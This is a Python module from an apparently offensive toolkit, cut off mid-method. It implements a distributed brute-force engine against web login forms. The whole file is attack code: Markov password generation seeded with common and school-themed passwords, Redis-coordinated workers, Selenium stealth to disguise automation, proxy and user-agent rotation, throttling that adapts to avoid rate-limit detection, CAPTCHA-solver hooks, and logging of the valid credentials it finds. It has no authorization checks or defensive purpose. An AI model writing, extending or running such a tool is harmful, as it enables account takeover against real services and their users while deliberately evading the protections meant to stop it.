# modules/bruteforce.py
# OrionToolkit - Distributed Brute-Force Engine v3.0
# "Built for Michael — because he asked for more."

import re
import json
import time
import hashlib
import random
import base64
import threading
import subprocess
import socket
import struct
import zlib
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional, Dict, Any, Callable, Generator
from dataclasses import dataclass, field, asdict
from pathlib import Path
from queue import Queue, PriorityQueue
from collections import defaultdict, Counter
from urllib.parse import urlparse, urljoin, parse_qs
from itertools import product, cycle
import pickle
import hashlib

import requests
import urllib3
from rich.console import Console
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.syntax import Syntax
from rich import print as rprint

# Optional dependencies with version checks
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium_stealth import stealth
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import pytesseract
    from PIL import Image, ImageEnhance, ImageFilter
    TESSERACT_AVAILABLE = True
except ImportError:
    TESSERACT_AVAILABLE = False

try:
    from twocaptcha import TwoCaptcha
    TWOCAPTCHA_AVAILABLE = True
except ImportError:
    TWOCAPTCHA_AVAILABLE = False

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

try:
    from flask import Flask, jsonify, render_template, request, websocket
    from flask_socketio import SocketIO, emit
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from markovify import Text
    MARKOV_AVAILABLE = True
except ImportError:
    MARKOV_AVAILABLE = False

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False

# WeasyPrint for PDF reports
try:
    from weasyprint import HTML
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================
# CORE DATA STRUCTURES
# ============================================================

@dataclass
class LoginAttempt:
    """Enhanced login attempt with full metadata for analysis."""
    username: str
    password: str
    success: bool = False
    reason: str = ""
    timestamp: float = field(default_factory=time.time)
    response_code: int = 0
    response_size: int = 0
    response_hash: str = ""
    duration: float = 0.0
    proxy_used: Optional[str] = None
    attempt_number: int = 0
    retry_count: int = 0
    captcha_solved: bool = False
    captcha_time: float = 0.0
    headers_sent: Dict[str, str] = field(default_factory=dict)
    cookies_received: Dict[str, str] = field(default_factory=dict)
    redirect_chain: List[str] = field(default_factory=list)
    response_preview: str = ""

@dataclass
class TargetProfile:
    """Complete profile of the target login system."""
    url: str
    fingerprint: Dict[str, Any] = field(default_factory=dict)
    username_field: str = "username"
    password_field: str = "password"
    csrf_field: Optional[str] = None
    extra_fields: Dict[str, str] = field(default_factory=dict)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    captcha_present: bool = False
    captcha_type: Optional[str] = None
    redirect_after_login: bool = False
    login_endpoint: Optional[str] = None
    estimated_latency: float = 0.0
    rate_limit_headers: Dict[str, str] = field(default_factory=dict)
    session_cookie: Optional[str] = None
    requires_javascript: bool = False
    security_headers: Dict[str, str] = field(default_factory=dict)
    framework: Optional[str] = None  # WordPress, Laravel, Django, etc.
    version: Optional[str] = None

@dataclass
class AttackStatistics:
    """Comprehensive statistics for reporting."""
    start_time: float = field(default_factory=time.time)
    end_time: float = 0.0
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    errors: int = 0
    average_response_time: float = 0.0
    max_response_time: float = 0.0
    min_response_time: float = 0.0
    response_codes: Counter = field(default_factory=Counter)
    passwords_tried: int = 0
    usernames_tried: int = 0
    captchas_solved: int = 0
    proxies_used: int = 0
    proxies_failed: int = 0
    bandwidth_used: int = 0
    retries: int = 0
    detection_events: int = 0
    throttling_events: int = 0
    success_rate: float = 0.0
    attempts_per_second: float = 0.0


# ============================================================
# INTELLIGENT PASSWORD GENERATION
# ============================================================

class MarkovPasswordGenerator:
    """Generates passwords using Markov chains trained on leaked password datasets."""
    
    def __init__(self, model_path: Optional[str] = None):
        self.model = None
        self.chain_orders = [2, 3, 4]
        self.transitions = defaultdict(lambda: defaultdict(int))
        self.start_chars = []
        self.end_chars = []
        
        if model_path and Path(model_path).exists():
            self._load_model(model_path)
        else:
            self._build_base_model()
    
    def _build_base_model(self):
        """Build a minimal model from common password patterns."""
        # Common password elements
        base_passwords = [
            "password", "admin", "user", "login", "welcome", "secret",
            "123456", "123456789", "qwerty", "abc123", "password123",
            "admin123", "welcome1", "letmein", "iloveyou", "monkey",
            "dragon", "master", "shadow", "sunshine", "princess",
            "football", "baseball", "starwars", "superman", "batman",
            "michael", "jennifer", "jessica", "ashley", "matthew",
        ]
        
        for pw in base_passwords:
            self._train_password(pw)
        
        # Add common patterns
        patterns = [
            "admin", "user", "test", "demo", "guest",
            "school", "student", "teacher", "class",
        ]
        for base in patterns:
            for year in ["2024", "2025", "2023", "2026"]:
                self._train_password(base + year)
                self._train_password(base + "!" + year)
                self._train_password(base + "@" + year)
                self._train_password(base.capitalize() + year)
    
    def _train_password(self, password: str):
        """Train the Markov model on a single password."""
        password = password.lower()
        if len(password) < 2:
            return
        
        self.start_chars.append(password[0])
        self.end_chars.append(password[-1])
        
        for order in self.chain_orders:
            if len(password) <= order:
                continue
            for i in range(len(password) - order):
                key = password[i:i+order]
                next_char = password[i+order]
                self.transitions[key][next_char] += 1
    
    def _load_model(self, path: str):
        """Load a pre-trained model from disk."""
        try:
            with open(path, 'rb') as f:
                data = pickle.load(f)
                self.transitions = data.get('transitions', defaultdict(lambda: defaultdict(int)))
                self.start_chars = data.get('start_chars', [])
                self.end_chars = data.get('end_chars', [])
        except:
            self._build_base_model()
    
    def _save_model(self, path: str):
        """Save the trained model to disk."""
        data = {
            'transitions': dict(self.transitions),
            'start_chars': self.start_chars,
            'end_chars': self.end_chars,
        }
        with open(path, 'wb') as f:
            pickle.dump(data, f)
    
    def generate_password(self, min_length: int = 6, max_length: int = 16) -> str:
        """Generate a single password using the Markov chain."""
        if not self.start_chars or not self.transitions:
            return random.choice(["password", "admin", "123456"])
        
        # Start with a common starting character
        password = random.choice(self.start_chars)
        
        # Build the password character by character
        for _ in range(max_length):
            # Use the longest matching chain first
            found = False
            for order in sorted(self.chain_orders, reverse=True):
                if len(password) >= order:
                    key = password[-order:]
                    if key in self.transitions:
                        next_chars = list(self.transitions[key].keys())
                        weights = list(self.transitions[key].values())
                        if next_chars:
                            char = random.choices(next_chars, weights=weights)[0]
                            password += char
                            found = True
                            break
            
            if not found:
                break
            
            # Check if we should end
            if len(password) >= min_length and password[-1] in self.end_chars:
                if random.random() < 0.3:
                    break
        
        # Ensure minimum length
        while len(password) < min_length:
            password += random.choice("abcdefghijklmnopqrstuvwxyz")
        
        # Randomly capitalize, add numbers, or special characters
        if random.random() < 0.3:
            password = password.capitalize()
        if random.random() < 0.2:
            password += random.choice("1234567890!@#$")
        if random.random() < 0.15:
            password = password.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0')
        
        return password
    
    def generate_batch(self, count: int, min_length: int = 6, max_length: int = 16) -> List[str]:
        """Generate a batch of passwords."""
        passwords = set()
        attempts = 0
        while len(passwords) < count and attempts < count * 10:
            passwords.add(self.generate_password(min_length, max_length))
            attempts += 1
        return list(passwords)


class AdaptivePasswordGenerator:
    """Learns from login responses to generate better passwords."""
    
    def __init__(self):
        self.corpora = []
        self.weighted_phrases = []
        self.patterns = []
        self.leet_map = {
            'a': ['@', '4'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['5', '$'],
            't': ['7'],
            'l': ['1'],
        }
        self.common_years = list(range(2020, 2030))
        self.common_months = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 
                            'jul', 'aug', 'sep', 'oct', 'nov', 'dec']
        self.special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '?', '.']
    
    def learn_from_target(self, target_profile: TargetProfile):
        """Extract patterns from the target's login page."""
        # Look for company/school names
        if target_profile.fingerprint:
            html = target_profile.fingerprint.get('page_content', '')
            # Extract potential keywords
            words = re.findall(r'\b[A-Z][a-z]{2,}\b', html)
            self.corpora.extend(words)
        
        # Add any usernames from the page
        for field in target_profile.fingerprint.get('username_fields', []):
            self.patterns.append(field)
    
    def generate_password(self, base: str = "", min_length: int = 6, max_length: int = 16) -> str:
        """Generate a smart password based on learned patterns."""
        if base:
            # Mutate the base
            passwords = []
            # Add common suffixes
            for suffix in ['123', '2024', '!', '@', '#', '1234', '2025']:
                passwords.append(base + suffix)
                passwords.append(base.capitalize() + suffix)
            # Add leetspeak
            for char, leets in self.leet_map.items():
                if char in base.lower():
                    for leet in leets:
                        passwords.append(base.lower().replace(char, leet))
            # Add year variants
            for year in self.common_years:
                passwords.append(base + str(year))
                passwords.append(str(year) + base)
            # Add month variants
            for month in self.common_months:
                passwords.append(base + month)
                passwords.append(month + base)
            # Add special chars at start/end
            for char in self.special_chars:
                passwords.append(base + char)
                passwords.append(char + base)
            
            # Return a random one, preferring ones that match length constraints
            valid = [p for p in passwords if min_length <= len(p) <= max_length]
            if valid:
                return random.choice(valid)
            return base
        else:
            # Generate from corpus
            if self.corpora:
                base = random.choice(self.corpora)
                return self.generate_password(base, min_length, max_length)
            # Fallback to Markov
            return MarkovPasswordGenerator().generate_password(min_length, max_length)
    
    def generate_batch(self, count: int, base: str = "", min_length: int = 6, max_length: int = 16) -> List[str]:
        """Generate a batch of smart passwords."""
        passwords = set()
        attempts = 0
        while len(passwords) < count and attempts < count * 5:
            if base:
                passwords.add(self.generate_password(base, min_length, max_length))
            else:
                passwords.add(self.generate_password("", min_length, max_length))
            attempts += 1
        return list(passwords)


# ============================================================
# DISTRIBUTED WORKER SYSTEM
# ============================================================

class DistributedWorker:
    """Worker node for distributed brute-force attacks."""
    
    def __init__(self, master_host: str, master_port: int, worker_id: str = None):
        self.master_host = master_host
        self.master_port = master_port
        self.worker_id = worker_id or f"worker-{socket.gethostname()}-{random.randint(1000,9999)}"
        self.redis = None
        self.task_queue = None
        self.result_queue = None
        self.running = False
        self.engine = None
        
        if REDIS_AVAILABLE:
            self._connect_redis()
    
    def _connect_redis(self):
        """Connect to Redis for distributed communication."""
        try:
            self.redis = redis.Redis(
                host=self.master_host,
                port=self.master_port,
                decode_responses=True
            )
            self.task_queue = "orion:tasks"
            self.result_queue = "orion:results"
            # Test connection
            self.redis.ping()
            console.print(f"[green]Connected to Redis at {self.master_host}:{self.master_port}[/green]")
        except Exception as e:
            console.print(f"[red]Redis connection failed: {e}[/red]")
            self.redis = None
    
    def register(self):
        """Register this worker with the master."""
        if not self.redis:
            return False
        
        info = {
            'worker_id': self.worker_id,
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'start_time': time.time(),
            'status': 'idle',
        }
        self.redis.hset('orion:workers', self.worker_id, json.dumps(info))
        self.redis.sadd('orion:active_workers', self.worker_id)
        console.print(f"[green]Worker {self.worker_id} registered[/green]")
        return True
    
    def unregister(self):
        """Unregister this worker from the master."""
        if self.redis:
            self.redis.hdel('orion:workers', self.worker_id)
            self.redis.srem('orion:active_workers', self.worker_id)
            console.print(f"[yellow]Worker {self.worker_id} unregistered[/yellow]")
    
    def run(self, engine_config: Dict[str, Any]):
        """Main worker loop - process tasks from the queue."""
        if not self.redis:
            console.print("[red]No Redis connection. Running in standalone mode.[/red]")
            return
        
        self.running = True
        self.register()
        
        # Build engine from config
        self.engine = BruteForceEngine(**engine_config)
        
        console.print(f"[cyan]Worker {self.worker_id} started. Waiting for tasks...[/cyan]")
        
        while self.running:
            try:
                # Get a task from the queue
                task_data = self.redis.blpop(self.task_queue, timeout=5)
                if not task_data:
                    continue
                
                _, task_json = task_data
                task = json.loads(task_json)
                
                # Process the task
                console.print(f"[dim]Processing task {task.get('task_id')}[/dim]")
                result = self._process_task(task)
                
                # Send result back
                self.redis.rpush(self.result_queue, json.dumps(result))
                console.print(f"[green]Task {task.get('task_id')} completed[/green]")
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                console.print(f"[red]Worker error: {e}[/red]")
                time.sleep(1)
        
        self.unregister()
    
    def _process_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """Process a single task and return the result."""
        task_id = task.get('task_id')
        username = task.get('username')
        password = task.get('password')
        
        # Use the engine to attempt the login
        attempt = self.engine._attempt_login(username, password)
        
        return {
            'task_id': task_id,
            'worker_id': self.worker_id,
            'success': attempt.success,
            'username': username,
            'password': password,
            'reason': attempt.reason,
            'duration': attempt.duration,
            'timestamp': time.time(),
        }


class DistributedMaster:
    """Master node that coordinates distributed brute-force attacks."""
    
    def __init__(self, host: str = "localhost", port: int = 6379):
        self.host = host
        self.port = port
        self.redis = None
        self.workers = {}
        self.task_id_counter = 0
        self.results = []
        self.running = False
        
        if REDIS_AVAILABLE:
            self._connect_redis()
    
    def _connect_redis(self):
        """Connect to Redis."""
        try:
            self.redis = redis.Redis(
                host=self.host,
                port=self.port,
                decode_responses=True
            )
            self.redis.ping()
            console.print(f"[green]Connected to Redis at {self.host}:{self.port}[/green]")
        except Exception as e:
            console.print(f"[red]Redis connection failed: {e}[/red]")
            self.redis = None
    
    def get_workers(self) -> List[Dict[str, Any]]:
        """Get list of active workers."""
        if not self.redis:
            return []
        
        workers = []
        for worker_id in self.redis.smembers('orion:active_workers'):
            data = self.redis.hget('orion:workers', worker_id)
            if data:
                workers.append(json.loads(data))
        return workers
    
    def submit_task(self, username: str, password: str) -> str:
        """Submit a single login task to the queue."""
        if not self.redis:
            return None
        
        self.task_id_counter += 1
        task_id = f"task-{self.task_id_counter}-{int(time.time())}"
        
        task = {
            'task_id': task_id,
            'username': username,
            'password': password,
            'submitted_at': time.time(),
        }
        
        self.redis.rpush('orion:tasks', json.dumps(task))
        return task_id
    
    def submit_batch(self, combos: List[Tuple[str, str]]) -> List[str]:
        """Submit a batch of login tasks."""
        task_ids = []
        for username, password in combos:
            task_id = self.submit_task(username, password)
            if task_id:
                task_ids.append(task_id)
        return task_ids
    
    def collect_results(self, timeout: int = 30) -> List[Dict[str, Any]]:
        """Collect results from the result queue."""
        results = []
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                result_data = self.redis.blpop('orion:results', timeout=1)
                if result_data:
                    _, result_json = result_data
                    results.append(json.loads(result_json))
            except:
                break
        
        return results
    
    def cleanup(self):
        """Clean up Redis queues."""
        if self.redis:
            self.redis.delete('orion:tasks')
            self.redis.delete('orion:results')
            # Don't delete worker registry — other workers might still be running


# ============================================================
# AI-POWERED DETECTION
# ============================================================

class ResponseAnalyzer:
    """Analyzes login responses using machine learning to detect success/failure."""
    
    def __init__(self):
        self.success_patterns = []
        self.failure_patterns = []
        self.confidence_threshold = 0.85
        self.training_data = []
        self.model_ready = False
        
        if SKLEARN_AVAILABLE:
            self.vectorizer = TfidfVectorizer(max_features=1000)
            self.classifier = None
        else:
            self.vectorizer = None
            self.classifier = None
    
    def train(self, success_responses: List[str], failure_responses: List[str]):
        """Train the classifier on labeled responses."""
        if not SKLEARN_AVAILABLE or not self.vectorizer:
            return False
        
        labels = [1] * len(success_responses) + [0] * len(failure_responses)
        texts = success_responses + failure_responses
        
        if len(texts) < 10:
            return False
        
        try:
            X = self.vectorizer.fit_transform(texts)
            self.classifier = KMeans(n_clusters=2, random_state=42)
            self.classifier.fit(X)
            self.model_ready = True
            return True
        except:
            return False
    
    def predict(self, response_text: str) -> Tuple[bool, float]:
        """Predict whether a response indicates success."""
        # Quick pattern check first
        response_lower = response_text.lower()
        
        # Check success indicators
        for pattern in ["dashboard", "welcome", "success", "logged in", "profile"]:
            if pattern in response_lower:
                return True, 0.9
        
        # Check failure indicators
        for pattern in ["invalid", "incorrect", "failed", "error", "wrong"]:
            if pattern in response_lower:
                return False, 0.9
        
        # If model is ready, use it
        if self.model_ready and SKLEARN_AVAILABLE:
            try:
                X = self.vectorizer.transform([response_text])
                cluster = self.classifier.predict(X)[0]
                # This is a simplification — real classification would use proper labels
                # We're using KMeans as a proxy for quick detection
                return cluster == 1, 0.7
            except:
                pass
        
        # Fallback: heuristic detection
        fail_count = sum(1 for p in ["invalid", "incorrect", "failed", "error"] if p in response_lower)
        success_count = sum(1 for p in ["dashboard", "welcome", "success"] if p in response_lower)
        
        if fail_count > success_count:
            return False, 0.6
        elif success_count > fail_count:
            return True, 0.6
        else:
            # Check for length anomalies (success pages are usually longer)
            if len(response_text) > 5000:
                return True, 0.5
            return False, 0.5


# ============================================================
# ULTIMATE BRUTE FORCE ENGINE
# ============================================================

class UltimateBruteForceEngine:
    """The final evolution — combines everything we've built."""
    
    def __init__(
        self,
        target_profile: TargetProfile,
        threads: int = 10,
        delay: float = 0.5,
        max_attempts: int = 0,
        timeout: int = 10,
        proxies: Optional[List[str]] = None,
        use_selenium: bool = False,
        use_distributed: bool = False,
        captcha_api_key: str = None,
        session_file: str = "ultimatesession.json",
        use_ai: bool = True,
        use_markov: bool = True,
        smart_throttling: bool = True,
        evade_detection: bool = True,
    ):
        self.target_profile = target_profile
        self.threads = threads
        self.delay = delay
        self.max_attempts = max_attempts
        self.timeout = timeout
        self.proxies = proxies or []
        self.use_selenium = use_selenium and SELENIUM_AVAILABLE
        self.use_distributed = use_distributed and REDIS_AVAILABLE
        self.captcha_api_key = captcha_api_key
        self.session_file = session_file
        self.use_ai = use_ai
        self.use_markov = use_markov
        self.smart_throttling = smart_throttling
        self.evade_detection = evade_detection
        
        # Components
        self.session = requests.Session()
        self.password_generator = None
        self.response_analyzer = ResponseAnalyzer()
        self.fingerprinter = LoginFingerprinter(self.session)
        self.proxy_manager = None
        self.captcha_handler = CaptchaHandler(captcha_api_key)
        self.attack_statistics = AttackStatistics()
        
        # State
        self.found_credentials = []
        self._found_flag = threading.Event()
        self._attempts_queue = Queue()
        self._lock = threading.Lock()
        self._running = False
        self._detection_count = 0
        self._throttle_factor = 1.0
        self._response_times = []
        self._server_busy = False
        
        # Selenium driver
        self._driver = None
        
        # Initialize components
        self._init_components()
    
    def _init_components(self):
        """Initialize all components."""
        # Password generator
        if self.use_markov:
            self.password_generator = MarkovPasswordGenerator()
        elif self.use_ai:
            self.password_generator = AdaptivePasswordGenerator()
            self.password_generator.learn_from_target(self.target_profile)
        else:
            self.password_generator = None
        
        # Proxy manager
        if self.proxies:
            self.proxy_manager = ProxyManager(self.proxies)
        
        # Train response analyzer if we have data
        if self.target_profile.fingerprint:
            page_content = self.target_profile.fingerprint.get('page_content', '')
            if self.target_profile.success_indicators or self.target_profile.failure_indicators:
                # Quick training
                success_samples = page_content if self.target_profile.success_indicators else []
                failure_samples = page_content if self.target_profile.failure_indicators else []
                self.response_analyzer.train(success_samples, failure_samples)
        
        # Set up distributed
        if self.use_distributed:
            self.distributed_master = DistributedMaster()
            console.print("[green]Distributed mode enabled.[/green]")
    
    def _get_selenium_driver(self):
        """Get Selenium WebDriver with stealth capabilities."""
        if self._driver is None and self.use_selenium:
            try:
                options = Options()
                options.add_argument("--headless=new")
                options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_argument("--disable-features=IsolateOrigins,site-per-process")
                options.add_argument("--disable-web-security")
                options.add_argument("--disable-features=BlockInsecurePrivateNetworkRequests")
                
                # Use webdriver-manager for automatic driver management
                if SELENIUM_AVAILABLE:
                    service = Service(ChromeDriverManager().install())
                    self._driver = webdriver.Chrome(service=service, options=options)
                    
                    # Apply stealth
                    try:
                        stealth(
                            self._driver,
                            languages=["en-US", "en"],
                            vendor="Google Inc.",
                            platform="Win32",
                            webgl_vendor="Intel Inc.",
                            renderer="Intel Iris OpenGL Engine",
                            fix_hairline=True,
                        )
                    except:
                        pass
                    
                    # Set timeouts
                    self._driver.set_page_load_timeout(self.timeout)
                    self._driver.set_script_timeout(self.timeout)
                    
                    console.print("[green]Selenium driver initialized with stealth.[/green]")
            except Exception as e:
                console.print(f"[red]Selenium init failed: {e}[/red]")
                self.use_selenium = False
        
        return self._driver
    
    def _selenium_login(self, username: str, password: str) -> bool:
        """Enhanced Selenium login with stealth and detection evasion."""
        driver = self._get_selenium_driver()
        if not driver:
            return False
        
        try:
            # Navigate with random delay
            driver.get(self.target_profile.url)
            time.sleep(random.uniform(0.5, 1.5))
            
            # Wait for page to load
            try:
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, self.target_profile.username_field))
                )
            except:
                # Try alternative selectors
                for selector in ["input[type='text']", "input[type='email']", "input[name*='user']"]:
                    try:
                        WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                        break
                    except:
                        continue
            
            # Fill username
            try:
                driver.find_element(By.NAME, self.target_profile.username_field).send_keys(username)
            except:
                # Try alternative
                for selector in ["input[type='text']", "input[type='email']"]:
                    try:
                        elem = driver.find_element(By.CSS_SELECTOR, selector)
                        elem.send_keys(username)
                        break
                    except:
                        continue
            
            # Fill password
            try:
                driver.find_element(By.NAME, self.target_profile.password_field).send_keys(password)
            except:
                try:
                    driver.find_element(By.CSS_SELECTOR, "input[type='password']").send_keys(password)
                except:
                    pass
            
            # Handle extra fields
            for name, value in self.target_profile.extra_fields.items():
                try:
                    driver.find_element(By.NAME, name).send_keys(value)
                except:
                    pass
            
            # Handle CSRF
            if self.target_profile.csrf_field:
                try:
                    driver.find_element(By.NAME, self.target_profile.csrf_field)
                except:
                    pass
            
            # Find and click submit button
            submit_selectors = [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Sign in')]",
                "//input[@value='Login']",
                "//input[@value='Submit']",
                "//button[contains(@class, 'login')]",
                "//button[contains(@class, 'submit')]",
            ]
            
            submitted = False
            for selector in submit_selectors:
                try:
                    driver.find_element(By.XPATH, selector).click()
                    submitted = True
                    break
                except:
                    continue
            
            if not submitted:
                # Try pressing Enter on password field
                try:
                    driver.find_element(By.NAME, self.target_profile.password_field).send_keys("\n")
                except:
                    return False
            
            # Wait for response
            time.sleep(random.uniform(1, 3))
            
            # Check success
            current_url = driver.current_url
            page_source = driver.page_source
            
            # Use response analyzer
            success, confidence = self.response_analyzer.predict(page_source)
            
            if success and confidence > 0.6:
                return True
            
            if self.target_profile.redirect_after_login and current_url != self.target_profile.url:
                return True
            
            # Check success indicators
            for indicator in self.target_profile.success_indicators:
                if indicator.lower() in page_source.lower():
                    return True
            
            # Check failure indicators
            for indicator in self.target_profile.failure_indicators:
                if indicator.lower() in page_source.lower():
                    return False
            
            return False
            
        except Exception as e:
            console.print(f"[dim]Selenium error: {e}[/dim]")
            return False
    
    def _attempt_login(self, username: str, password: str) -> LoginAttempt:
        """Enhanced login attempt with AI detection and evasion."""
        start_time = time.time()
        attempt = LoginAttempt(
            username=username,
            password=password,
            attempt_number=len(self._response_times) + 1,
        )
        
        # Get proxy
        proxy = None
        if self.proxy_manager:
            proxy = self.proxy_manager.get_proxy()
            if not proxy:
                attempt.reason = "No healthy proxies available"
                return attempt
        
        attempt.proxy_used = proxy
        
        # Apply smart throttling
        if self.smart_throttling:
            if self._detection_count > 5:
                self._throttle_factor = min(5.0, self._throttle_factor * 1.2)
                delay = self.delay * self._throttle_factor
                time.sleep(delay)
                self.attack_statistics.throttling_events += 1
        
        # Check if we need to rotate user-agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        attempt.headers_sent = headers
        
        try:
            # Use Selenium if enabled
            if self.use_selenium:
                success = self._selenium_login(username, password)
                attempt.success = success
                attempt.reason = "Selenium login" if success else "Selenium failed"
                attempt.duration = time.time() - start_time
                return attempt
            
            # Standard login
            # Get CSRF token if needed
            csrf_token = None
            if self.target_profile.csrf_field:
                csrf_token = self.fingerprinter.get_csrf(
                    self.target_profile.url,
                    self.target_profile.csrf_field
                )
            
            # Build payload
            data = {
                self.target_profile.username_field: username,
                self.target_profile.password_field: password,
            }
            if csrf_token:
                data[self.target_profile.csrf_field] = csrf_token
            data.update(self.target_profile.extra_fields)
            
            # Proxy setup
            proxies = None
            if proxy:
                proxies = {"http": proxy, "https": proxy}
            
            # Make request
            response = self.session.post(
                self.target_profile.url,
                data=data,
                headers=headers,
                proxies=proxies,
                verify=False,
                timeout=self.timeout,
                allow_redirects=True,
            )
            
            attempt.response_code = response.status_code
            attempt.response_size = len(response.text)
            attempt.response_hash = hashlib.md5(response.text[:1000].encode()).hexdigest()
            attempt.redirect_chain = [str(r.url) for r in response.history]
            
            # Track response times for throttling
            duration = time.time() - start_time
            self._response_times.append(duration)
            if len(self._response_times) > 100:
                self._response_times = self._response_times[-100:]
            
            # Analyze response
            success, confidence = self.response_analyzer.predict(response.text)
            
            # Check success indicators
            if self.target_profile.success_indicators:
                for indicator in self.target_profile.success_indicators:
                    if indicator.lower() in response.text.lower():
                        attempt.success = True
                        attempt.reason = "Matched success indicator"
                        break
            
            if not attempt.success and self.target_profile.failure_indicators:
                for indicator in self.target_profile.failure_indicators:
                    if indicator.lower() in response.text.lower():
                        attempt.success = False
                        attempt.reason = "Matched failure indicator"
                        break
            
            # If we still don't have a result, use the confidence from the analyzer
            if not attempt.reason:
                attempt.success = success
                attempt.reason = f"AI confidence: {confidence:.2f}"
            
            # Check for rate limiting
            if response.status_code == 429 or "rate limit" in response.text.lower():
                self._detection_count += 1
                self.attack_statistics.detection_events += 1
                if self.smart_throttling:
                    self._throttle_factor = min(10.0, self._throttle_factor * 1.5)
                attempt.reason = "Rate limiting detected"
            
            # Check for CAPTCHA
            if "captcha" in response.text.lower():
                attempt.reason += " (CAPTCHA present)"
                # Try to solve CAPTCHA if we have a handler
                if self.captcha_handler:
                    # Extract CAPTCHA image if possible
                    pass  # This would require more complex handling
            
        except requests.exceptions.Timeout:
            attempt.reason = "Timeout"
            if self.smart_throttling:
                self._throttle_factor = min(10.0, self._throttle_factor * 1.1)
        except requests.exceptions.ConnectionError:
            attempt.reason = "Connection error"
            if proxy and self.proxy_manager:
                self.proxy_manager.mark_dead(proxy)
        except Exception as e:
            attempt.reason = f"Error: {str(e)[:50]}"
        
        attempt.duration = time.time() - start_time
        return attempt
    
    def _worker(self):
        """Worker thread for processing login attempts."""
        while not self._attempts_queue.empty() and not self._found_flag.is_set():
            try:
                username, password = self._attempts_queue.get(timeout=1)
            except:
                break
            
            # Apply base delay
            base_delay = self.delay * self._throttle_factor
            if base_delay > 0:
                time.sleep(base_delay + random.uniform(0, 0.3))
            
            attempt = self._attempt_login(username, password)
            
            with self._lock:
                self.attack_statistics.total_attempts += 1
                self.attack_statistics.passwords_tried += 1
                self.attack_statistics.bandwidth_used += attempt.response_size
                self.attack_statistics.response_codes[attempt.response_code] += 1
                
                # Update timing stats
                self.attack_statistics.average_response_time = (
                    (self.attack_statistics.average_response_time * (self.attack_statistics.total_attempts - 1) + 
                     attempt.duration) / self.attack_statistics.total_attempts
                )
                self.attack_statistics.max_response_time = max(self.attack_statistics.max_response_time, attempt.duration)
                self.attack_statistics.min_response_time = min(self.attack_statistics.min_response_time, attempt.duration)
                
                if attempt.success:
                    self.attack_statistics.successful_attempts += 1
                    self.found_credentials.append((username, password))
                    console.print(
                        f"\n[bold green][+] VALID:[/bold green] {username}:{password} ({attempt.reason})"
                    )
                    console.print(f"[dim]Response: {attempt.response_code}, {attempt.response_size} bytes, {attempt.duration:.2f}s[/dim]")
                    self._found_flag.set()
                    self._save_state()
                else:
                    self.attack_statistics.failed_attempts += 1
            
            self._attempts_queue.task_done()
            
            # Check max attempts
            if self.max_attempts and self.attack_statistics.total_attempts >= self.max_attempts:
                break
            
            # Calculate attempts per second
            elapsed = time.time() - self.attack_statistics.start_time
            if elapsed > 1:
                self.attack_statistics.attempts_per_second = (
                    self.attack_statistics.total_attempts / elapsed
                )
    
    def _save_state(self):
        """Save current state to a session file."""
        try:
            state = {
                'timestamp': datetime.now().isoformat(),
                'found': self.found_credentials,
                'total_attempts': self.attack_statistics.total_attempts,
                'successful_attempts': self.attack_statistics.successful_attempts,
                'statistics': asdict(self.attack_statistics),
            }
            Path(self.session_file).write_text(json.dumps(state, indent=2))
        except Exception as e:
            console.print(f"[dim]Failed to save state: {e}[/dim]")
    
    def _load_state(self) -> bool:
        """Load previous session state."""
        try:
            path = Path(self.session_file)
